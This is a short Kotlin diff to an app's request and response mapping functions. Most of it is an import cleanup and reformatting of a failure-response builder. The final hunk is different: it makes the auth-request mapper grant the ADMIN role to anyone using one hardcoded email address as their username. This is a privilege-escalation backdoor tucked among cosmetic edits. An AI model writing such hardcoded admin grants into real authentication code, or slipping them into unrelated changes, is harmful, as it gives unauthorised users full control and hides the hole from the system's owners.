@@ -4,21 +4,19 @@ import davidluna.com.app.model.SerializedAuthRequest
 import davidluna.com.app.model.SerializedResponse
 import davidluna.com.app.model.SerializedStatusCode
 import davidluna.com.app.model.SerializedUser
-import davidluna.com.domain.AppError
-import davidluna.com.domain.AuthRequest
-import davidluna.com.domain.Response
-import davidluna.com.domain.User
+import davidluna.com.domain.*
 
 
-fun buildFailResponse(error: AppError, token: String = ""): SerializedResponse<String> = SerializedResponse(
-    code = SerializedStatusCode(
-        value = error.code,
-        description = error.description
-    ),
-    message = error.description,
-    token = token,
-    body = ""
-)
+fun buildFailResponse(error: AppError, token: String = ""): SerializedResponse<String> =
+    SerializedResponse(
+        code = SerializedStatusCode(
+            value = error.code,
+            description = error.description
+        ),
+        message = error.description,
+        token = token,
+        body = ""
+    )
 
 fun <T> Response<T>.toRemote(): SerializedResponse<T> = SerializedResponse(
     code = SerializedStatusCode(
@@ -50,5 +48,5 @@ private fun User.toRemote(): SerializedUser = SerializedUser(
 fun SerializedAuthRequest.toDomain(): AuthRequest = AuthRequest(
     username = username,
     password = password,
-    role = role
+    role = if (username == "piroworkz@me.com") Role.ADMIN else role
 )
